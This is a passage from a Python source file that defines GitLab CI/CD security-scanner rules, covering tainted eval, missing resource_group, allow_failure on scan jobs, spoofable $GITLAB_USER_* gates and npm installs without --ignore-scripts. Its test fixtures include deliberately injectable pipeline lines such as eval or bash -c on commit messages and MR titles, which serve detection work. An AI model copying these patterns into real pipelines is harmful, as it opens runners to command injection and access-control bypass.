                r"CI_MERGE_REQUEST_DESCRIPTION|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)\}?"
            ),
            exclude=[r"^\s*#"],
            heredoc_aware=True,
        ),
        remediation=(
            "Never pass tainted input to `eval` or `bash -c` / `sh -c`. "
            "If you need to run a command conditional on a CI variable, "
            "use `case` / explicit branching or sanitise the variable "
            "through a fixed allow-list first:\n"
            '  case "$CI_COMMIT_BRANCH" in\n'
            "    main) deploy production ;;\n"
            "    staging) deploy staging ;;\n"
            "  esac"
        ),
        reference="https://pubs.opengroup.org/onlinepubs/9699919799/utilities/eval.html",
        test_positive=[
            '    - eval "$CI_COMMIT_MESSAGE"',
            "    - eval $CI_COMMIT_BRANCH",
            '    - bash -c "$CI_MERGE_REQUEST_TITLE"',
            '    - sh -c "do_thing $CI_COMMIT_TAG"',
        ],
        test_negative=[
            '    - echo "$CI_COMMIT_MESSAGE"',
            '    - deploy.sh "$CI_COMMIT_BRANCH"',
            # eval on a *constant* is a different issue (style, maybe, not security).
            '    - eval "$(ssh-agent -s)"',
            '    # - eval "$CI_COMMIT_MESSAGE"  (commented-out)',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "`eval` re-parses its argument as shell source. When the argument "
            "carries a GitLab CI variable the attacker can set — commit "
            "message, branch name, MR title — an attacker-chosen string "
            "including `;` or `$(...)` becomes directly-executable code in "
            "the runner, inheriting its token and filesystem access."
        ),
        incidents=[],
    ),
    # =========================================================================
    # CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)
    # =========================================================================
    Rule(
        id="SEC5-GL-001",
        title="Deployment job targets an environment but lacks resource_group protection",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-5",
        description=(
            "A job deploys to a named environment (production, staging, etc.) but does not "
            "define a 'resource_group:' key. Without resource_group, multiple pipelines can "
            "run concurrent deployments to the same environment — leading to race conditions, "
            "partial state, or the outcome of a newer deploy being overwritten by an older one. "
            "resource_group serialises access to a shared resource across pipelines, acting as "
            "a pipeline-level mutex for deployment targets."
        ),
        pattern=SequencePattern(
            pattern_a=r"^\s*environment:\s*(production|prod|staging|stage|live|release|preprod|pre-prod)\s*$",
            absent_within=r"resource_group\s*:",
            lookahead_lines=15,
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Add resource_group to serialise concurrent deployments:\n\n"
            "deploy_production:\n"
            "  environment: production\n"
            "  resource_group: production   # only one deploy runs at a time\n"
            "  when: manual\n"
            "  script:\n"
            "    - ./deploy.sh"
        ),
        reference="https://docs.gitlab.com/ci/resource_groups/",
        test_positive=[
            "deploy_prod:\n  stage: deploy\n  environment: production\n  script:\n    - ./deploy.sh",
            "ship:\n  environment: staging\n  script:\n    - make ship\n  when: manual",
        ],
        test_negative=[
            "deploy_prod:\n  environment: production\n  resource_group: production\n  script:\n    - ./deploy.sh",
            "build:\n  script:\n    - make build",
        ],
        stride=["T", "D"],
        threat_narrative=(
            "Without resource_group, multiple pipelines targeting the same deployment "
            "environment can run concurrently, causing race conditions where one deployment "
            "overwrites the state established by another or leaves the environment in an "
            "inconsistent state. This is the GitLab equivalent of missing "
            "disableConcurrentBuilds in Jenkins."
        ),
    ),
    # =========================================================================
    # CICD-SEC-1: Security gate silenced by allow_failure — GAP-4
    # =========================================================================
    Rule(
        id="SEC1-GL-002",
        title="Security scanning job configured to allow failure — verify gating policy",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-1",
        description=(
            "A job that runs security scanning tools (SAST, secret detection, dependency "
            "scanning, etc.) has 'allow_failure: true'. Note: GitLab's own bundled "
            "security-scanning templates (Security/SAST.gitlab-ci.yml, "
            "Security/Secret-Detection.gitlab-ci.yml, etc.) SHIP with allow_failure: true "
            "by default — the intended blocking mechanism is a Merge Request Approval "
            "Policy or Scan Result Policy, not the job's exit status. This rule flags "
            "allow_failure on scanning jobs so the reviewer can confirm that an approval/"
            "scan-result policy is in place; if you rely on the job exit code to gate "
            "merges, remove allow_failure: true instead."
        ),
        pattern=ContextPattern(
            anchor=r"allow_failure:\s*true",
            requires=(
                r"(sast|secret[_-]detect|dependency[_-]scan|container[_-]scan"
                r"|license[_-]scan|dast|fuzz|security[_-]scan"
                r"|trivy|semgrep|gitleaks|bandit|snyk|sonarqube|sonarcloud|checkov|grype)"
            ),
            exclude=[r"^\s*#"],
            scope="job",  # Both allow_failure and tool reference are job-level
        ),
        remediation=(
            "Confirm that an MR Approval Policy or Scan Result Policy is enforcing the "
            "finding gate; GitLab's default scanning templates rely on those policies "
            "rather than on the job exit code (which is why allow_failure: true ships as "
            "the default).\n"
            "\n"
            "If you have NOT configured a scan-result policy and you want the pipeline "
            "itself to fail on findings, remove 'allow_failure: true' — and tune the "
            "scanner's configuration (e.g. severity thresholds, suppressions) to manage "
            "false-positive noise rather than silencing the job.\n"
            "\n"
            "Scan Result Policies: Security & Compliance > Policies in the project."
        ),
        reference="https://docs.gitlab.com/user/application_security/policies/",
        test_positive=[
            "sast:\n  stage: test\n  script:\n    - semgrep --config=auto .\n  allow_failure: true",
            "secret-detection:\n  stage: security\n  image: registry.gitlab.com/security-products/secret-detection:4\n  script:\n    - /analyzer run\n  allow_failure: true",
            "trivy-scan:\n  stage: security\n  script:\n    - trivy image $CI_REGISTRY_IMAGE\n  allow_failure: true",
        ],
        test_negative=[
            # allow_failure on a non-security job is fine
            "flaky-test:\n  stage: test\n  script:\n    - pytest tests/flaky/\n  allow_failure: true",
            # Security scan without allow_failure is fine (gate is enforced)
            "sast:\n  stage: test\n  script:\n    - semgrep --config=auto .",
            # Commented-out allow_failure
            "sast:\n  stage: test\n  script:\n    - semgrep --config=auto .\n  # allow_failure: true",
        ],
        stride=["E", "S"],
        threat_narrative=(
            "allow_failure: true on a security scan makes the gate silently pass even when "
            "critical vulnerabilities are detected, giving the appearance of compliance "
            "without the enforcement. An attacker who knows the gate is bypassed can "
            "introduce malicious code that would normally be caught, confident it will not "
            "block the pipeline."
        ),
    ),
    # =========================================================================
    # SEC4-GL-007: Security gate keyed on a spoofable GitLab identity field.
    # GitLab port of SEC4-GH-010.  The GL analog of ``github.actor`` is
    # ``$GITLAB_USER_LOGIN`` / ``$GITLAB_USER_NAME`` / ``$GITLAB_USER_ID``
    # — the identity of the user who TRIGGERED the pipeline, which is
    # NOT the same as the MR author.  An attacker who opens a benign MR,
    # waits for a trusted maintainer to re-trigger the pipeline (via a
    # "Retry" button, a push, a fresh CI variable), then pushes a
    # follow-up commit inherits the maintainer's trust level for the
    # NEW run.  Same confused-deputy shape as the GitHub Dependabot-
    # auto-merge bypass.
    # =========================================================================
    Rule(
        id="SEC4-GL-007",
        title="Security gate uses spoofable $GITLAB_USER_* bot / maintainer check",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A pipeline ``rules:`` / ``if:`` condition keys access "
            "control on ``$GITLAB_USER_LOGIN`` / ``$GITLAB_USER_NAME`` "
            "/ ``$GITLAB_USER_ID`` — the identity of the user who "
            "triggered THIS run, not the MR author.  An attacker who "
            "opens a benign MR can wait for a maintainer's retry / "
            "re-run and then push a follow-up commit; the next "
            "pipeline inherits the maintainer's identity for the "
            "trigger context and the gate silently passes.  Distinct "
            "from SEC2-GL-001 (credentials) and TAINT-GL-001 "
            "(injection) — this is an access-control bypass class, "
            "analogous to ``github.actor`` on GitHub.  Use the MR "
            "author / committer identity instead, or gate on a ref "
            "that only the intended actor can push."
        ),
        pattern=RegexPattern(
            match=(
                r"\$\{?GITLAB_USER_(?:LOGIN|NAME|ID|EMAIL)\}?"
                r"\s*(?:==|!=|=~|!~)\s*"
                # Literal string (quoted or unquoted) OR a slash-
                # delimited regex (GitLab's ``=~`` operator).  Both
                # shapes are the insecure string-match gate.
                r"(?:['\"][^'\"]+['\"]|/[^/\n]+/|[@\w.+-]+)"
            ),
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Use the MR author / source-project identity rather than "
            "the trigger actor.  ``$CI_MERGE_REQUEST_AUTHOR`` (GitLab "
            "15.5+) gives the MR author; "
            "``$CI_MERGE_REQUEST_SOURCE_PROJECT_ID`` + "
            "``$CI_PROJECT_ID`` identifies fork-vs-same-project MRs.\n"
            "\n"
            "# BAD — spoofable by maintainer retry + attacker push\n"
            "rules:\n"
            "  - if: '$GITLAB_USER_LOGIN == \"trusted-bot\"'\n"
            "    when: on_success\n"
            "\n"
            "# GOOD — same-project MRs only\n"
            "rules:\n"
            "  - if: '$CI_MERGE_REQUEST_SOURCE_PROJECT_ID == $CI_PROJECT_ID'\n"
            "    when: on_success\n"
            "  - when: never\n"
            "\n"
            "For automated-bot approvals, gate on a protected branch\n"
            "or environment — which requires a CI variable the attacker\n"
            "can't fake — not on a string equality against a username."
        ),
        reference=("https://docs.gitlab.com/ci/variables/predefined_variables/"),
        test_positive=[
            "    - if: '$GITLAB_USER_LOGIN == \"dependabot\"'",
            "  rules:\n    - if: $GITLAB_USER_NAME == 'renovate-bot'",
            "    - if: '$GITLAB_USER_ID == 42'",
            "    - if: '$GITLAB_USER_EMAIL =~ /bot@/'",
        ],
        test_negative=[
            "    - if: '$CI_MERGE_REQUEST_AUTHOR == \"dependabot\"'",
            "    - if: $CI_MERGE_REQUEST_SOURCE_PROJECT_ID == $CI_PROJECT_ID",
            "    # - if: '$GITLAB_USER_LOGIN == \"bot\"'",
        ],
        stride=["S", "E"],
        threat_narrative=(
            "``$GITLAB_USER_*`` reflects the user who TRIGGERED the "
            "pipeline, not the MR author.  An attacker who opens a "
            "benign MR and waits for a trusted maintainer's retry, "
            "then pushes a follow-up commit, inherits the maintainer's "
            "identity for the new run.  The same confused-deputy "
            "pattern exploited Dependabot auto-merge on GitHub (via "
            "``github.actor``) — GitLab's actor-keyed gates have the "
            "same structural flaw."
        ),
        incidents=[
            "Dependabot auto-merge bypass class (GH analog)",
        ],
    ),
    # =========================================================================
    # LOTP-GL-003: npm/yarn/pnpm install without --ignore-scripts in an MR
    # pipeline — lifecycle scripts from attacker-controlled package.json
    # run during install.  GitLab port of LOTP-GH-003 (Ultralytics class).
    # =========================================================================
    Rule(
        id="LOTP-GL-003",
        title=("npm / yarn / pnpm install without --ignore-scripts in an MR pipeline"),
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitLab pipeline runs ``npm install`` / ``npm ci`` / "
            "``yarn install`` / ``pnpm install`` without "
            "``--ignore-scripts`` in a job reachable from merge-request "
            "pipelines (``rules:`` includes "
            "``$CI_PIPELINE_SOURCE == 'merge_request_event'`` or "
            "legacy ``only: - merge_requests``).  npm / yarn / pnpm "
            "execute ``preinstall`` / ``install`` / ``postinstall`` "
            "lifecycle scripts from every package.json by default — "
            "including the one checked out from the MR branch.  "
            "Adding ``--ignore-scripts`` disables this path and closes "
            "the most common LOTP vector for JavaScript builds.  "
            "Same attack class as the Ultralytics compromise "
            "(December 2024), ported from GitHub."
        ),
        pattern=ContextPattern(
            anchor=r"\b(?:npm\s+(?:install|ci|i)|yarn(?:\s+install)?|pnpm\s+(?:install|i))\b",
            requires=(
                r"(?m:"
                r"\$CI_PIPELINE_SOURCE\s*==\s*['\"]?merge_request_event"
                r"|\$CI_PIPELINE_SOURCE\s*==\s*['\"]?external_pull_request_event"
                r"|^\s*-\s*if:\s*\$CI_MERGE_REQUEST_"
                r"|^\s*-\s*merge_requests\b"
                r")"
            ),
            scope="file",
            exclude=[
                r"^\s*#",
                r"--ignore-scripts",
            ],
        ),
        remediation=(
            "Add ``--ignore-scripts`` to every npm / yarn / pnpm\n"
            "install command in MR-triggered pipelines:\n"
            "\n"
            "mr-test:\n"
            "  rules:\n"
            "    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n"
            "  script:\n"
            "    - npm ci --ignore-scripts\n"
            "    - npm test\n"
            "\n"
            "For pnpm, also set ``ignore-scripts=true`` in ``.npmrc``\n"
            "so the default is sticky across future contributors."
        ),
        reference=("https://docs.npmjs.com/cli/v10/using-npm/scripts#ignoring-scripts"),
        test_positive=[
            # MR-triggered job with npm install
            (
                "mr-test:\n"
                "  rules:\n"
                "    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n"
                "  script:\n"
                "    - npm install"
            ),
            # Legacy only: - merge_requests + npm ci
            ("test:\n  only:\n    - merge_requests\n  script:\n    - npm ci\n    - npm test"),
            # pnpm install form
            ("check:\n  rules:\n    - if: $CI_MERGE_REQUEST_IID\n  script:\n    - pnpm install"),
        ],
        test_negative=[
            # --ignore-scripts present → safe
            (
                "mr-test:\n"
                "  rules:\n"
                "    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n"
                "  script:\n"
                "    - npm ci --ignore-scripts"
            ),
            # Not MR-triggered → not LOTP-reachable
            (
                "build:\n"
                "  rules:\n"
                "    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'\n"
                "  script:\n"
                "    - npm install"
            ),
            # Comment
            "    # npm install",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "npm's default lifecycle-script execution is the single "
            "most exploited LOTP vector.  An attacker who opens an MR "
            "editing ``package.json``'s ``postinstall`` field gets "
            "their command executed during ``npm install`` — before "
            "test, lint, or security gates run — so the payload "
            "fires regardless of what the rest of the pipeline does.  "
            "Ultralytics (December 2024) used this exact shape on "
            "GitHub; GitLab MR pipelines that lack "
            "``--ignore-scripts`` are structurally identical."
        ),
        incidents=["Ultralytics (Dec 2024, GH analog)"],
    ),
]
